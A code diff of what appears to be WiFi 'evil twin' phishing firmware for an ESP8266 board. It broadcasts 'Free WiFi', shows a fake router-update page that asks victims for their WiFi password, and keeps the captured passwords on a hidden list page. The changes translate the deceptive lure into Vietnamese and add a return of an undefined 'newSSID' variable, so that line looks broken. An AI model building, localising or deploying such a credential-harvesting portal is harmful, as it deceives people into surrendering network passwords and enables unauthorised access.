@@ -11,13 +11,13 @@
 const char* SSID_NAME = "Free WiFi";
 
 // Default main strings
-#define SUBTITLE "Router info."
-#define TITLE "Update"
-#define BODY "Your router firmware is out of date. Update your firmware to continue browsing normally."
-#define POST_TITLE "Updating..."
-#define POST_BODY "Your router is being updated. Please, wait until the proccess finishes.</br>Thank you."
-#define PASS_TITLE "Passwords"
-#define CLEAR_TITLE "Cleared"
+#define SUBTITLE "Thông tin bộ định tuyến."
+#define TITLE "Cập nhật"
+#define BODY "Bộ định tuyến của bạn đã lỗi thời. Cập nhật để tiếp tục sử dụng."
+#define POST_TITLE "Đang cập nhật..."
+#define POST_BODY "Bộ định tuyến đang được cập nhật, làm ơn chờ quá trình cập nhật kết thúc</br>Cảm ơn."
+#define PASS_TITLE "Mật khẩu"
+#define CLEAR_TITLE "Đã dọn dẹp"
 
 // Init system settings
 const byte HTTP_CODE = 200;
@@ -44,7 +44,7 @@ String input(String argName) {
   a.substring(0,200); return a; }
 
 String footer() { 
-  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
+  return "</div><div class=q><a>&#169; Trung Trần.</a></div>";
 }
 
 String header(String t) {
@@ -67,8 +67,8 @@ String header(String t) {
   return h; }
 
 String index() {
-  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post><label>WiFi password:</label>"+
-    "<input type=password name=m></input><input type=submit value=Start></form>" + footer();
+  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post><label>Nhập mật khẩu Wifi:</label>"+
+    "<input type=password name=m></input><input type=submit value=Bắt đầu></form>" + footer();
 }
 
 String posted() {
@@ -89,12 +89,12 @@ String posted() {
 }
 
 String pass() {
-  return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
+  return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Quay lại chỉ mục</a></p><p><a style=\"color:blue\" href=/clear>Dọn dẹp mật khẩu</a></p></center>" + footer();
 }
 
 String ssid() {
-  return header("Change SSID") + "<p>Here you can change the SSID name. After pressing the button \"Change SSID\" you will lose the connection, so reconnect to the new SSID.</p>" + "<form action=/postSSID method=post><label>New SSID name:</label>"+
-    "<input type=text name=s></input><input type=submit value=\"Change SSID\"></form>" + footer();
+  return header("Thay đổi SSID") + "<p>Bạn có thể thay đổi tên SSID.Sau khi ấn vào nút \"Thay đổi SSID\" bạn sẽ mất kết nối và kết nối lại với SSID mới.</p>" + "<form action=/postSSID method=post><label>Tên SSID mới:</label>"+
+    "<input type=text name=s></input><input type=submit value=\"Thay đổi SSID\"></form>" + footer();
 }
 
 String postedSSID() {
@@ -105,6 +105,7 @@ String postedSSID() {
   EEPROM.write(postedSSID.length(), '\0');
   EEPROM.commit();
   WiFi.softAP(postedSSID);
+  return newSSID;
 }
 
 String clear() {
@@ -112,7 +113,7 @@ String clear() {
   passEnd = passStart; // Setting the password end location -> starting position.
   EEPROM.write(passEnd, '\0');
   EEPROM.commit();
-  return header(CLEAR_TITLE) + "<div><p>The password list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
+  return header(CLEAR_TITLE) + "<div><p>Mật khẩu đã được dọn dẹp.</div></p><center><a style=\"color:blue\" href=/>Quay lại chỉ mục</a></center>" + footer();
 }
 
 void BLINK() { // The built-in LED will blink 5 times after a password is posted.
